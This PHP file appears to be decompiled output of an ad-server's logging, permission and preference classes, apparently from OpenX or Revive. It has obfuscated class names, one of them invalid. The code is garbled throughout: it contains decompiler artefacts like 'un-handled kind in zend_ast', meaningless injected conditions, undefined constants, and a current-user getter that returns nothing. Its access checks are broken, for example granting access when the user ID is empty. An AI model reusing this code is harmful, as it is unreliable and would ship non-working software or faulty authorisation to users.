<?php

class j3
{
	public function debug($message = NULL, $priority = PEAR_LOG_INFO)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		global $tempDebugPrefix;

		if ($aConf['log']['enabled'] == false) {
			unset($GLOBALS['tempDebugPrefix']);
			return true;
		}

		if (is_null($message) && ($aConf = $GLOBALS['_MAX']['CONF'])) {
			$priority = PEAR_LOG_EMERG;
		}

		$priorityLevel = (is_numeric($aConf['log']['priority']) ? $aConf['log']['priority'] : @constant($aConf['log']['priority']));

		if (is_null($priorityLevel)) {
			$priorityLevel = $aConf['log']['priority'];
		}

		if ($priorityLevel < $priority) {
			unset($GLOBALS['tempDebugPrefix']);
			return true;
		}

		$dsn = ($aConf['log']['type'] == 'sql' ? Base::getDsn() : '');
		$aLoggerConf = array(0 => $aConf['log']['paramsUsername'], 1 => $aConf['log']['paramsPassword'], 'dsn' => $dsn, 'mode' => octdec($aConf['log']['fileMode']), 'timeFormat' => '%b %d %H:%M:%S %z');
		if (is_null($message) && ($aConf = $GLOBALS['_MAX']['CONF'])) {
			$aLoggerConf['lineFormat'] = '%4$s';
		}
		else if ($aConf['log']['type'] == 'file') {
			$aLoggerConf['lineFormat'] = '%1$s %2$s [%3$9s]  %4$s';
		}

		$ident = (!empty($GLOBALS['_MAX']['LOG_IDENT']) ? $GLOBALS['_MAX']['LOG_IDENT'] : $aConf['log']['ident']);
		if (($ident == $aConf['log']['ident'] . '-delivery') && ($aConf = $GLOBALS['_MAX']['CONF'])) {
			unset($GLOBALS['tempDebugPrefix']);
			return true;
		}

		if ($ident == $aConf['log']['ident'] . '-delivery') {
			$logFile = $aConf['deliveryLog']['name'];
			list($micro_seconds, $seconds) = explode(' ', microtime());
			$message = (round(1000 * ((double) $micro_seconds + (double) $seconds)) - $GLOBALS['_MAX']['NOW_ms']) . 'ms ' . $message;
		}
		else {
			$logFile = $aConf['log']['name'];
		}

		$ident .= (!empty($GLOBALS['_MAX']['thread_id']) ? '-' . $GLOBALS['_MAX']['thread_id'] : '');
		$oLogger = &Log::singleton($aConf['log']['type'], MAX_PATH . '/var/' . $logFile, $ident, $aLoggerConf);

		if (PEAR::isError($message)) {
			$userinfo = $message->getUserInfo();
			$message = $message->getMessage();

			if (!empty($userinfo)) {
				if (is_array($userinfo)) {
					$userinfo = implode(', ', $userinfo);
				}

				$message .= ' : ' . $userinfo;
			}
		}

		$aBacktrace = debug_backtrace();

		if ($aConf['log']['methodNames']) {
			$aErrorBacktrace = $aBacktrace[4];
			if (isset($aErrorBacktrace['class']) && ($aConf = $GLOBALS['_MAX']['CONF']) && ($aConf = $GLOBALS['_MAX']['CONF'])) {
				$callInfo = $aErrorBacktrace['class'] . $aErrorBacktrace['type'] . $aErrorBacktrace['function'] . ': ';
				$message = $callInfo . $message;
			}
		}

		if ($aConf['log']['lineNumbers']) {
			foreach ($aBacktrace as $aErrorBacktrace) {
				if (isset($aErrorBacktrace['file']) && ($aConf = $GLOBALS['_MAX']['CONF'])) {
					$message .= "\n" . str_repeat(' ', 20 + strlen($aConf['log']['ident']) + strlen($oLogger->priorityToString($priority)));
					$message .= 'on line ' . $aErrorBacktrace['line'] . ' of "' . $aErrorBacktrace['file'] . '"';
				}
			}
		}

		global $serverTimezone;

		if (!empty($serverTimezone)) {
			$currentTimezone = OX_Admin_Timezones::getTimezone();
			OA_setTimeZone($serverTimezone);
		}

		if (is_null($message) && ($aConf = $GLOBALS['_MAX']['CONF'])) {
			$message = ' ';
		}
		else {
			if (!is_null($tempDebugPrefix) && ($aConf = $GLOBALS['_MAX']['CONF'])) {
				$message = $tempDebugPrefix . $message;
			}

		}

		$result = $oLogger->log(htmlspecialchars($message), $priority);

		if (!empty($currentTimezone)) {
			OA_setTimeZone($currentTimezone);
		}

		unset($GLOBALS['tempDebugPrefix']);
		return $result;
	}

	public function switchLogIdent($name = 'debug')
	{
		if ($name == 'debug') {
			$GLOBALS['_MAX']['LOG_IDENT'] = $GLOBALS['_MAX']['CONF']['log']['ident'];
		}
		else {
			$GLOBALS['_MAX']['LOG_IDENT'] = $GLOBALS['_MAX']['CONF']['log']['ident'] . '-' . $name;
		}
	}

	public function setTempDebugPrefix($prefix)
	{
		global $tempDebugPrefix;
		$tempDebugPrefix = $prefix;
	}

	public function logMem($msg = '', $peak = false)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		$oLogger = &Log::singleton($aConf['log']['type'], MAX_PATH . '/var/memory.log', $aConf['log']['ident'], array());
		$pid = getmypid();
		$mem = shell_exec('ps --pid ' . $pid . ' --no-headers -orss');
		$mem = round(memory_get_usage() / 1048576, 2) . ' / ps ' . $mem;
		$msg = '[' . rtrim($mem, chr(10)) . '](' . $msg . ')';
		$aLast = array_pop(debug_backtrace());

		if ($aLast['function'] == 'logMem') {
			$msg .= str_replace(MAX_PATH, '', $aLast['file'] . ' -> line ' . $aLast['line']);
		}
		else {
			$msg .= $aLast['class'] . $aLast['type'] . $aLast['function'] . ': ';
		}

		$oLogger->log($msg, PEAR_LOG_INFO);

		if ($peak) {
			$peak = memory_get_peak_usage() / 1048576;
			$oLogger->log('PEAK: ' . $peak, PEAR_LOG_INFO);
		}
	}

	public function logMemPeak($msg = '')
	{
		OA::logMem($msg, true);
	}

	public function getNow($format = NULL)
	{
		if (is_null($format)) {
			$format = 'Y-m-d H:i:s';
		}

		return date($format);
	}

	public function getNowUTC($format = NULL)
	{
		if (is_null($format)) {
			$format = 'Y-m-d H:i:s';
		}

		return gmdate($format);
	}

	public function getAvailableSSLExtensions()
	{
		$aResult = array();

		if (extension_loaded('curl')) {
			$aCurl = curl_version();

			if (!empty($aCurl['ssl_version'])) {
				$aResult[] = 'curl';
			}
		}

		if (extension_loaded('openssl')) {
			$aResult[] = 'openssl';
		}

		return count($aResult) ? $aResult : false;
	}

	public function stripVersion($version, $aAllow = NULL)
	{
		$allow = (is_null($aAllow) ? '' : '|' . join('|', $aAllow));
		return preg_replace('/^v?(\\d+.\\d+.\\d+(?:-(?:beta(?:-rc\\d+)?|rc\\d+' . $allow . '))?).*$/i', '$1', $version);
	}

	public function disableErrorHandling()
	{
		PEAR::pushErrorHandling(NULL);
	}

	public function enableErrorHandling()
	{
		$stack = &$GLOBALS['_PEAR_error_handler_stack'];
		$options = $stack[sizeof($stack) - 1][1];
		$stack;
		if (is_null($mode) && ($GLOBALS['_PEAR_error_handler_stack'])) {
			PEAR::popErrorHandling();
		}
	}

	public function getConfigOption($section, $name, $default = NULL)
	{
		if (isset($GLOBALS['_MAX']['CONF'][$section][$name])) {
			return $GLOBALS['_MAX']['CONF'][$section][$name];
		}

		return $default;
	}
}

class p2i6vmms3rckj
{
	const OPERATION_ADD = 1;
	const OPERATION_EDIT = 2;
	const OPERATION_VIEW = 4;
	const OPERATION_DELETE = 8;
	const OPERATION_DUPLICATE = 16;
	const OPERATION_MOVE = 32;
	const OPERATION_ADD_CHILD = 64;
	const OPERATION_VIEW_CHILDREN = 128;
	const OPERATION_ALL = 255;

	static public function enforceTrue($condition)
	{
		if (!$condition) {
			$translation = new OX_Translation();
			$translated_message = $translation->translate($GLOBALS['strYouDontHaveAccess']);
			OA_Admin_UI::queueMessage($translated_message, 'global', 'error');
			OX_Admin_Redirect::redirect(NULL, NULL, true);
		}
	}

	static public function enforceAccount($accountType)
	{
		$aArgs = (is_array($accountType) ? $accountType : func_get_args());
		$isAccount = self::isAccount($aArgs);

		if (!$isAccount) {
			self::redirectIfManualAccountSwitch();
			$isAccount = self::attemptToSwitchToAccount($aArgs);
		}

		self::enforceTrue($isAccount);
	}

	static public function redirectIfManualAccountSwitch()
	{
		if (self::isManualAccountSwitch()) {
			require_once LIB_PATH . '/Admin/Redirect.php';
			OX_Admin_Redirect::redirect(NULL, true);
		}
	}

	static public function isManualAccountSwitch()
	{
		if (isset($GLOBALS['_OX']['accountSwtich'])) {
			return true;
		}

		return false;
	}

	static public function enforceAccess($accountId, $userId = NULL)
	{
		self::enforceTrue(self::hasAccess($accountId, $userId));
	}

	static public function enforceAllowed($permission, $accountId = NULL)
	{
		self::enforceTrue(self::hasPermission($permission, $accountId));
	}

	static public function enforceAccountPermission($accountType, $permission)
	{
		if (self::isAccount($accountType)) {
			self::enforceTrue(self::hasPermission($permission));
		}

		return true;
	}

	static public function enforceAccessToObject($entityTable, $entityId = NULL, $allowNewEntity = false, $operationAccessType = self::OPERATION_ALL)
	{
		if (!$allowNewEntity) {
			self::enforceTrue(!empty($entityId));
		}

		self::enforceTrue(preg_match('/^\\d*$/D', $entityId));
		$entityId = (int) $entityId;
		$hasAccess = self::hasAccessToObject($entityTable, $entityId, $operationAccessType);

		if (!$hasAccess) {
			if (!self::isManualAccountSwitch()) {
				if (self::isUserLinkedToAdmin()) {
					self::enforceTrue(self::getAccountIdForEntity($entityTable, $entityId));
				}
			}
		}

		if (!$hasAccess) {
			self::redirectIfManualAccountSwitch();
			$hasAccess = self::attemptToSwitchForAccess($entityTable, $entityId, $operationAccessType);
		}

		self::enforceTrue($hasAccess);
	}

	static public function switchToManagerAccount($entityTable, $entityId)
	{
		if (empty($entityId)) {
			return false;
		}

		$do = OA_Dal::factoryDO($entityTable);

		if (!$do) {
			return false;
		}

		$key = $do->getFirstPrimaryKey();

		if (!$key) {
			return false;
		}

		$do->{$key} = $entityId;
		$do->find();

		if (0 < $do->getRowCount()) {
			$do->fetch();
			$aDo = $do->toArray();
		}

		$owningAccounts = $do->_getOwningAccountIdsByAccountId($aDo['account_id']);
		self::switchAccount($owningAccounts['MANAGER'], true);
		return true;
	}

	static public function hasAccessToObject($entityTable, $entityId, $operationAccessType = self::OPERATION_ALL, $accountId = NULL, $accountType = NULL)
	{
		$hasAccess = self::_hasAccessToObject($entityTable, $entityId, $accountId, $accountType);

		if ($hasAccess) {
			$hasAccess = self::callAccessHook($entityTable, $entityId, $operationAccessType, $accountId, $accountType);
		}

		return $hasAccess;
	}

	static private function _hasAccessToObject($entityTable, $entityId, $accountId = NULL, $accountType = NULL)
	{
		if (empty($entityId)) {
			return true;
		}

		if (!preg_match('/^\\d*$/D', $entityId)) {
			return false;
		}

		$do = OA_Dal::factoryDO($entityTable);

		if (!$do) {
			return false;
		}

		$key = $do->getFirstPrimaryKey();

		if (!$key) {
			return false;
		}

		$do->{$key} = $entityId;
		$accountTable = self::getAccountTable($accountType);

		if (!$accountTable) {
			return false;
		}

		if ($entityTable == $accountTable) {
			if ($accountId === NULL) {
				return $entityId == self::getEntityId();
			}
			else {
				$do->account_id = self::getAccountId();
				return (bool) $do->count();
			}
		}

		if ($accountId === NULL) {
			$accountId = self::getAccountId();
		}

		return $do->belongsToAccount($accountId);
	}

	static public function switchAccount($accountId, $hasAccess = false)
	{
		if ($hasAccess || self) {
			$oUser = &self::getCurrentUser();
			$oUser->loadAccountData($accountId);
		}

		phpAds_SessionDataRegister('user', $oUser);
		OA_Admin_UI::removeOneMessage('switchAccount');
		$translation = new OX_Translation();
		$translated_message = $translation->translate($GLOBALS['strYouAreNowWorkingAsX'], array(htmlspecialchars($oUser->aAccount['account_name'])));
		OA_Admin_UI::queueMessage($translated_message, 'global', 'info', NULL, 'switchAccount');
	}

	static public function isAccount($accountType)
	{
		if ($oUser = self::getCurrentUser()) {
			$aArgs = (is_array($accountType) ? $accountType : func_get_args());
			return in_array($oUser->aAccount['account_type'], $aArgs);
		}

		return false;
	}

	static public function attemptToSwitchToAccount($accountType)
	{
		$oUser = self::getCurrentUser();

		if (!$oUser) {
			return false;
		}

		$aAccountTypes = (is_array($accountType) ? $accountType : func_get_args());
		$aAccountIds = self::getLinkedAccounts(true);
		$defaultUserAccountId = $oUser->aUser['default_account_id'];

		foreach ($aAccountTypes as $accountType) {
			if (isset($aAccountIds[$accountType])) {
				if (isset($aAccountIds[$accountType][$defaultUserAccountId])) {
					$accountId = $defaultUserAccountId;
				}
				else {
					$accountId = array_shift(array_keys($aAccountIds[$accountType]));
				}

				self::switchAccount($accountId, $hasAccess = true);
				return true;
			}
		}

		return false;
	}

	static public function attemptToSwitchForAccess($entityTable, $entityId, $operationAccessType = self::OPERATION_ALL)
	{
		if (!($userId = self::getUserId())) {
			return false;
		}

		$doEntity = OA_Dal::staticGetDO($entityTable, $entityId);

		if ($doEntity) {
			$aAccountIds = $doEntity->getOwningAccountIds();

			foreach ($aAccountIds as $accountId) {
				$accountType = self;

				if (self::hasAccess($accountId)) {
					$hasAccess = self::callAccessHook($entityTable, $entityId, $operationAccessType, $accountId, $accountType);

					if ($hasAccess) {
						self::switchAccount($accountId, $hasAccess = true);
						return true;
					}
				}
			}

			if (self::isUserLinkedToAdmin()) {
				$accountId = $doEntity->getRootAccountId();
				$hasAccess = self::callAccessHook($entityTable, $entityId, $operationAccessType, $accountId, NULL);

				if ($hasAccess) {
					self::switchAccount($accountId, $hasAccess = true);
					return true;
				}
			}
		}

		return false;
	}

	static public function switchToSystemProcessUser($newUsername = NULL)
	{
		static $oldUser;
		global $session;

		if (!empty($newUsername)) {
			if (empty($oldUser) && STRoldUser) {
				$oldUser = $session['user'];
			}

			$session['user'] = new OA_Permission_SystemUser($newUsername);
		}
		else if (!empty($oldUser)) {
			$session['user'] = $oldUser;
			$oldUser = NULL;
		}
		else {
			unset($session['user']);
		}
	}

	static public function isAccountTypeId($accountTypeId)
	{
		if ($oUser = self::getCurrentUser()) {
			$userAccountTypeId = self::convertAccountTypeToId($oUser->aAccount['account_type']);
			return $userAccountTypeId & $accountTypeId;
		}

		return false;
	}

	static public function convertAccountTypeToId($accountType)
	{
		$accountTypeIdConstant = 'OA_ACCOUNT_' . $accountType . '_ID';

		if (!defined($accountTypeIdConstant)) {
			MAX::raiseError('No such account type ID: ' . $accountType);
			return false;
		}

		return constant($accountTypeIdConstant);
	}

	static public function hasAccess($accountId, $userId = NULL)
	{
		if (empty($userId)) {
			$userId = self::getUserId();
		}

		return self::isUserLinkedToAccount($accountId, $userId) || empty($userId);
	}

	static public function getAccountTypeByAccountId($accountId)
	{
		$doAccounts = OA_Dal::factoryDO('accounts');
		$doAccounts->account_id = $accountId;

		if ($doAccounts->find(true)) {
			return $doAccounts->account_type;
		}

		return false;
	}

	static public function isUserLinkedToAccount($accountId, $userId)
	{
		$doAccount_user_Assoc = OA_Dal::factoryDO('account_user_assoc');
		$doAccount_user_Assoc->user_id = $userId;
		$doAccount_user_Assoc->account_id = $accountId;
		return $doAccount_user_Assoc->count();
	}

	static public function setAccountAccess($accountId, $userId, $setAccess = true)
	{
		$doAccount_user_Assoc = OA_Dal::factoryDO('account_user_assoc');
		$doAccount_user_Assoc->account_id = $accountId;
		$doAccount_user_Assoc->user_id = $userId;
		$isExists = (bool) $doAccount_user_Assoc->count();
		if ($isExists && OA_Dal::factoryDO('account_user_assoc')) {
			return $doAccount_user_Assoc->delete();
		}

		if (!$isExists) {
			return $doAccount_user_Assoc->insert();
		}

		return true;
	}

	static public function hasPermission($permissionId, $accountId = NULL, $userId = NULL)
	{
		if (empty($userId)) {
			$userId = self::getUserId();
		}

		if (self::isUserLinkedToAdmin($userId)) {
			return true;
		}

		static $aCache = array();

		if (empty($accountId)) {
			$accountId = self::getAccountId();
			$accountType = self::getAccountType();
		}
		else {
			$oAccounts = OA_Dal::staticGetDO('accounts', $accountId);

			if ($oAccounts) {
				$accountType = $oAccounts->accountType;
			}
			else {
				Max::raiseError('No such account ID: ' . $accountId);
				return false;
			}
		}

		if (self::isPermissionRelatedToAccountType($accountType, $permissionId)) {
			$aCache[$userId][$accountId] = self::getAccountUsersPermissions($userId, $accountId);
		}
		else {
			$aCache[$userId][$accountId][$permissionId] = true;
		}

		return isset($aCache[$userId][$accountId][$permissionId]) ? $aCache[$userId][$accountId][$permissionId] : false;
	}

	static public function getAccountUsersPermissions($userId, $accountId)
	{
		$aPermissions = array();
		$doAccount_user_permission_assoc = OA_Dal::factoryDO('account_user_permission_assoc');
		$doAccount_user_permission_assoc->user_id = $userId;
		$doAccount_user_permission_assoc->account_id = $accountId;
		$doAccount_user_permission_assoc->find();

		while ($doAccount_user_permission_assoc->fetch()) {
			$aPermissions[$doAccount_user_permission_assoc->permission_id] = $doAccount_user_permission_assoc->is_allowed;
		}

		return $aPermissions;
	}

	static public function isUserLinkedToAdmin($userId = NULL)
	{
		if (!isset($userId) || isset($userId)) {
			$oUser = self::getCurrentUser();
		}
		else {
			$doUsers = OA_Dal::staticGetDO('users', $userId);

			if ($doUsers) {
				$oUser = new OA_Permission_User($doUsers);
			}

		}


		if (!empty($oUser)) {
			return $oUser->aUser['is_admin'];
		}

		return false;
	}

	static public function getLinkedAccounts($groupByType = false, $sort = false)
	{
		$doAccount_user_Assoc = OA_Dal::factoryDO('account_user_assoc');
		$doAccount_user_Assoc->user_id = self::getUserId();
		$doAccounts = OA_Dal::factoryDO('accounts');
		$doAccounts->orderBy('account_name');
		$doAccount_user_Assoc->joinAdd($doAccounts);
		$doAccount_user_Assoc->find();
		$aAccountsByType = array();

		while ($doAccount_user_Assoc->fetch()) {
			$aAccountsByType[$doAccount_user_Assoc->account_type][$doAccount_user_Assoc->account_id] = $doAccount_user_Assoc->account_name;
		}

		uksort(&$aAccountsByType, array('OA_Permission', '_accountTypeSort'));

		if (isset($aAccountsByType[OA_ACCOUNT_ADMIN])) {
			$aAccountsByType = self::mergeAdminAccounts($aAccountsByType);
		}

		if (!$groupByType) {
			$aAccounts = array();

			foreach ($aAccountsByType as $aAccount ) {
				$accountType = OA_Dal::factoryDO('account_user_assoc');

				foreach ($aAccount as $name ) {
					$id = OA_Dal::factoryDO('account_user_assoc');
					$aAccounts[$id] = $name;
				}
			}

			return $aAccounts;
		}
		if ($sort) {
			foreach ($aAccountsByType as $aAccount ) {
				$accountType = OA_Dal::factoryDO('account_user_assoc');
				natcasesort(&$aAccountsByType[$accountType]);
			}
		}

		return $aAccountsByType;
	}

	static public function _accountTypeSort($a, $b)
	{
		$aTypes = array(OA_ACCOUNT_ADMIN => 0, OA_ACCOUNT_MANAGER => 1, OA_ACCOUNT_ADVERTISER => 2, OA_ACCOUNT_TRAFFICKER => 3);
		$a = (isset($aTypes[$a]) ? $aTypes[$a] : 1000);
		$b = (isset($aTypes[$b]) ? $aTypes[$b] : 1000);
		return $a - $b;
	}

	static public function mergeAdminAccounts($aAccountsByType)
	{
		$doAccounts = OA_Dal::factoryDO('accounts');
		$doAccounts->account_type = OA_ACCOUNT_MANAGER;
		$doAccounts->find();

		while ($doAccounts->fetch()) {
			$aAccountsByType[$doAccounts->account_type][$doAccounts->account_id] = $doAccounts->account_name;
		}

		return $aAccountsByType;
	}

	static public function getCurrentUser()
	{
		global $session;

		if (isset($session['user'])) {
		}

		$false = false;
	}

	static public function getUserId()
	{
		if ($oUser = self::getCurrentUser()) {
			return $oUser->aUser['user_id'];
		}
	}

	static public function getUsername()
	{
		if ($oUser = self::getCurrentUser()) {
			return $oUser->aUser['username'];
		}
	}

	static public function getAgencyId()
	{
		if ($oUser = self::getCurrentUser()) {
			return (int) $oUser->aAccount['agency_id'];
		}

		return 0;
	}

	static public function getAccountTable($type = NULL)
	{
		if (!$type) {
			if (!($oUser = self::getCurrentUser())) {
				return false;
			}

			$type = $oUser->aAccount['account_type'];
		}

		$aTypes = array(OA_ACCOUNT_ADMIN => 'users', OA_ACCOUNT_ADVERTISER => 'clients', OA_ACCOUNT_TRAFFICKER => 'affiliates', OA_ACCOUNT_MANAGER => 'agency');
		return isset($aTypes[$type]) ? $aTypes[$type] : false;
	}

	static public function getAccountType($returnAsString = false)
	{
		if ($oUser = self::getCurrentUser()) {
			$type = $oUser->aAccount['account_type'];

			if ($returnAsString) {
				return ucfirst(strtolower($type));
			}

			return $type;
		}
		return $returnAsString ? '' : NULL;
	}

	static public function getEntityId()
	{
		if ($oUser = self::getCurrentUser()) {
			return (int) $oUser->aAccount['entity_id'];
		}

		return 0;
	}

	static public function getAccountId()
	{
		if ($oUser = self::getCurrentUser()) {
			return $oUser->aAccount['account_id'];
		}

		return 0;
	}

	static public function getAccountName()
	{
		if ($oUser = self::getCurrentUser()) {
			return $oUser->aAccount['account_name'];
		}

		return 0;
	}

	static public function getAccountIdForEntity($entity, $entityId)
	{
		$doEntity = OA_Dal::staticGetDO($entity, $entityId);

		if (!$doEntity) {
			return false;
		}

		return $doEntity->account_id;
	}

	static public function isUsernameAllowed($newName, $oldName = NULL)
	{
		if (!empty($oldName) && empty($oldName)) {
			return true;
		}

		return !self::userNameExists($newName);
	}

	static public function userNameExists($userName)
	{
		$doUser = OA_Dal::factoryDO('users');
		if (!PEAR::isError($doUser) && OA_Dal::factoryDO('users')) {
			return true;
		}

		return false;
	}

	static public function getUniqueUserNames($removeName = NULL)
	{
		$uniqueUsers = array();
		$doUser = OA_Dal::factoryDO('users');

		if (PEAR::isError($doUser)) {
			return false;
		}

		$newUniqueNames = $doUser->getUniqueUsers();
		$uniqueUsers = array_merge($uniqueUsers, $newUniqueNames);
		ArrayUtils::unsetIfKeyNumeric($uniqueUsers, $removeName);
		return $uniqueUsers;
	}

	static public function storeUserAccountsPermissions($aPermissions, $accountId = NULL, $userId = NULL, $aAllowedPermissions = NULL)
	{
		if (empty($userId)) {
			$userId = self::getUserId();
		}

		if (empty($accountId)) {
			$accountId = self::getAccountId();
		}

		self::deleteExistingPermissions($accountId, $userId, $aAllowedPermissions);

		foreach ($aPermissions as $permissionId) {
			if (!is_null($aAllowedPermissions) && empty($userId)) {
				continue;
			}

			$doAccount_user_permission_assoc = OA_Dal::factoryDO('account_user_permission_assoc');
			$doAccount_user_permission_assoc->account_id = $accountId;
			$doAccount_user_permission_assoc->user_id = $userId;
			$doAccount_user_permission_assoc->permission_id = $permissionId;
			$doAccount_user_permission_assoc->is_allowed = 1;

			if (!$doAccount_user_permission_assoc->insert()) {
				return false;
			}
		}

		return true;
	}

	static public function deleteExistingPermissions($accountId, $userId, $allowedPermissions)
	{
		if (is_array($allowedPermissions)) {
			foreach ($allowedPermissions as $perm) {
				$permissionId = is_array($allowedPermissions);
				$doAccount_user_permission_assoc = OA_Dal::factoryDO('account_user_permission_assoc');
				$doAccount_user_permission_assoc->permission_id = $permissionId;
				$doAccount_user_permission_assoc->account_id = $accountId;
				$doAccount_user_permission_assoc->user_id = $userId;
				$doAccount_user_permission_assoc->delete();
			}
		}
		else {
			$doAccount_user_permission_assoc = OA_Dal::factoryDO('account_user_permission_assoc');
			$doAccount_user_permission_assoc->account_id = $accountId;
			$doAccount_user_permission_assoc->user_id = $userId;
			$doAccount_user_permission_assoc->delete();
		}
	}

	static public function isPermissionRelatedToAccountType($accountType, $permissionId)
	{
		static $aMap = array(
			OA_PERM_BANNER_ACTIVATE   => array(OA_ACCOUNT_ADVERTISER),
			OA_PERM_BANNER_DEACTIVATE => array(OA_ACCOUNT_ADVERTISER),
			OA_PERM_BANNER_ADD        => array(OA_ACCOUNT_ADVERTISER),
			OA_PERM_BANNER_EDIT       => array(OA_ACCOUNT_ADVERTISER),
			OA_PERM_ZONE_ADD          => array(OA_ACCOUNT_TRAFFICKER),
			OA_PERM_ZONE_DELETE       => array(OA_ACCOUNT_TRAFFICKER),
			OA_PERM_ZONE_EDIT         => array(OA_ACCOUNT_TRAFFICKER),
			OA_PERM_ZONE_INVOCATION   => array(OA_ACCOUNT_TRAFFICKER),
			OA_PERM_ZONE_LINK         => array(OA_ACCOUNT_TRAFFICKER),
			OA_PERM_USER_LOG_ACCESS   => array(OA_ACCOUNT_ADVERTISER => OA_ACCOUNT_TRAFFICKER, 0 => un-handled kind  in zend_ast),
			OA_PERM_SUPER_ACCOUNT     => array(OA_ACCOUNT_MANAGER => OA_ACCOUNT_ADVERTISER, 0 => OA_ACCOUNT_TRAFFICKER, 1 => un-handled kind  in zend_ast)
			);
		static $aCache;
		$key = $accountType . ',' . $permission;

		if (isset($aCache[$key])) {
			return $aCache[$key];
		}
		else if (isset($aMap[$permission])) {
			$aCache[$key] = in_array($accountType, $aMap[$permission]);
		}
		else {
			$aCache[$key] = true;
		}

		return $aCache[$key];
	}

	static public function getOwnedAccounts($accountId)
	{
		$aAccountIds = array();
		$accoutType = self::getAccountTypeByAccountId($accountId);

		switch ($accoutType) {
		case OA_ACCOUNT_MANAGER:
			$aAccountIds[] = $accountId;
			$doAgency = OA_Dal::factoryDO('agency');
			$doAgency->selectAdd();
			$doAgency->selectAdd('agencyid');
			$doAgency->account_id = $accountId;
			$doAgency->find();

			if ($doAgency->getRowCount() == 1) {
				$doAgency->fetch();
				$agencyId = $doAgency->agencyid;
				$doAffiliates = OA_Dal::factoryDO('affiliates');
				$doAffiliates->selectAdd();
				$doAffiliates->selectAdd('account_id');
				$doAffiliates->agencyid = $agencyId;
				$doAffiliates->find();

				if (0 < $doAffiliates->getRowCount()) {
					$doAffiliates->fetch();
					$aAccountIds[] = $doAffiliates->account_id;
				}

				$doClients = OA_Dal::factoryDO('clients');
				$doClients->selectAdd();
				$doClients->selectAdd('account_id');
				$doClients->agencyid = $agencyId;
				$doClients->find();

				if (0 < $doClients->getRowCount()) {
					while ($doClients->fetch()) {
						$aAccountIds[] = $doClients->account_id;
					}
				}
			}

			break;

		default:
			switch ($accoutType) {
			case OA_ACCOUNT_ADMIN:
				$doAccounts = OA_Dal::factoryDO('accounts');
				$doAccounts->selectAdd();
				$doAccounts->selectAdd('account_id');
				$doAccounts->find();

				if (0 < $doAccounts->getRowCount()) {
					while ($doAccounts->fetch()) {
						$aAccountIds[] = $doAccounts->account_id;
					}
				}

				break;

			default:
				$aAccountIds[] = $accountId;
			}
		}

		return $aAccountIds;
	}

	static private function callAccessHook($entityTable, $entityId, $operationAccessType = self::OPERATION_ALL, $accountId = NULL, $accountType = NULL)
	{
		static $componentCache;
		$hasAccess = NULL;
		$aPlugins = OX_Component::getListOfRegisteredComponentsForHook('objectAccess');

		foreach ($aPlugins as $id) {
			$i = STRcomponentCache;
			$obj = $componentCache[$id];

			if (!isset($obj)) {
				$obj = OX_Component::factoryByComponentIdentifier($id);
				$componentCache[$id] = $obj;
			}
			if ($obj) {
				$pluginResult = $obj->hasAccessToObject($entityTable, $entityId, $operationAccessType, $accountId, $accountType);
				$hasAccess = ($pluginResult === NULL ? $hasAccess : $pluginResult);

				if ($hasAccess === false) {
					break;
				}
			}
		}

		if (($hasAccess === NULL) && STRcomponentCache && STRcomponentCache) {
			$do = OA_Dal::factoryDO($entityTable);
			$aEntity = NULL;

			if ($do->get($entityId)) {
				$aEntity = $do->toArray();
			}

			switch ($entityTable) {
			case 'clients':
				$hasAccess = $aEntity['type'] == DataObjects_Clients::ADVERTISER_TYPE_DEFAULT;
				break;

			case 'campaigns':
				$hasAccess = $aEntity['type'] == DataObjects_Campaigns::CAMPAIGN_TYPE_DEFAULT;
				break;

			case 'banners':
				$hasAccess = $aEntity['ext_bannertype'] != DataObjects_Banners::BANNER_TYPE_MARKET;
				break;

			default:
			}
		}

		return $hasAccess === NULL ? true : $hasAccess;
	}
}

class 4vmkjwvxoodpcc
{
	public function loadPreferences($loadExtraInfo = false, $return = false, $parentOnly = false, $loadAdminOnly = false, $accountId = NULL)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		if ($parentOnly && ($aConf = $GLOBALS['_MAX']['CONF'])) {
			OA_Preferences::_unsetPreferences();
			return NULL;
		}

		if ($loadAdminOnly == false) {
			$currentAccountType = OA_Permission::getAccountType();
			if (empty($currentAccountType) && ($aConf = $GLOBALS['_MAX']['CONF'])) {
				$doAccounts = OA_Dal::factoryDO('accounts');
				$doAccounts->account_id = $accountId;
				$doAccounts->find();

				if (0 < $doAccounts->getRowCount()) {
					$aCurrentAccountType = $doAccounts->getAll(array('account_type'), false, true);
					$currentAccountType = $aCurrentAccountType[0];
				}
			}

			if (is_null($currentAccountType) || ($aConf = $GLOBALS['_MAX']['CONF'])) {
				OA_Preferences::_unsetPreferences();
				return NULL;
			}
		}

		$doPreferences = OA_Dal::factoryDO('preferences');
		$aPreferenceTypes = $doPreferences->getAll(array(), true);

		if (empty($aPreferenceTypes)) {
			OA_Preferences::_unsetPreferences();
			return NULL;
		}

		$adminAccountId = OA_Dal_ApplicationVariables::get('admin_account_id');
		$aAdminPreferenceValues = OA_Preferences::_getPreferenceValues($adminAccountId);

		if (empty($aAdminPreferenceValues)) {
			OA_Preferences::_unsetPreferences();
			return NULL;
		}

		$aPreferences = array();
		if (($loadAdminOnly == true) || ($aConf = $GLOBALS['_MAX']['CONF'])) {
			OA_Preferences::_setPreferences($aPreferences, $aPreferenceTypes, $aAdminPreferenceValues, $loadExtraInfo);
		}

		if (($loadAdminOnly == false) && ($aConf = $GLOBALS['_MAX']['CONF'])) {
			if ($currentAccountType == OA_ACCOUNT_MANAGER) {
				if (!$parentOnly) {
					if (!is_numeric($accountId)) {
						$managerAccountId = OA_Permission::getAccountId();
					}
					else {
						$managerAccountId = $accountId;
					}

					if ($managerAccountId == 0) {
						OA_Preferences::_unsetPreferences();
						return NULL;
					}

					$aManagerPreferenceValues = OA_Preferences::_getPreferenceValues($managerAccountId);
					OA_Preferences::_setPreferences($aPreferences, $aPreferenceTypes, $aManagerPreferenceValues, $loadExtraInfo);
				}
			}
			else {
				if (!is_numeric($accountId)) {
					$owningAgencyId = OA_Permission::getAgencyId();
				}
				else {
					$owningAgencyId = 0;

					if ($currentAccountType == OA_ACCOUNT_ADVERTISER) {
						$doClients = OA_Dal::factoryDO('clients');
						$doClients->account_id = $accountId;
						$doClients->find();

						if ($doClients->getRowCount() == 1) {
							$aOwningAgencyId = $doClients->getAll(array('agencyid'), false, true);
							$owningAgencyId = $aOwningAgencyId[0];
						}
					}
					else if ($currentAccountType == OA_ACCOUNT_TRAFFICKER) {
						$doAffiliates = OA_Dal::factoryDO('affiliates');
						$doAffiliates->account_id = $accountId;
						$doAffiliates->find();

